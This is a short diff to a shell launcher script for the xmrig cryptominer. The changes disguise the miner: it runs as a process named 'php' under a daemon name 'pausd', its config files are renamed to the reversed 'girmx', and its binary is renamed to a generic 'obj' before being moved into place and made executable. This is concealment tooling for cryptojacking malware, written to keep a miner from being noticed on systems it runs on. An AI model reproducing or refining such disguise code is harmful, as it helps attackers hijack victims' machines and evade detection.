@@ -5,9 +5,9 @@ OBJ_MASK="${OBJ_MASK:-php}"
 DAEMON="${DAEMON:-pausd}"
 DAEMON_NAME="${DAEMON##* }"
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
-    OBJ_CFG="${OBJ_CFG:-xmrig_tnl_skip.1.json.tpl}"
+    OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
 else
-    OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
+    OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
 fi
 OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
 # ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
@@ -19,7 +19,7 @@ if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
 fi
 
 ## object in sln should be present in pl/
-OBJ_NAME=${OBJ_NAME:-xmrig}
+OBJ_NAME=${OBJ_NAME:-obj}
 [ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
 [ ! -e "$CLM_MASK" ] && mv pl/clm "$CLM_MASK"
 chmod +x "${OBJ_MASK}" &>/dev/null
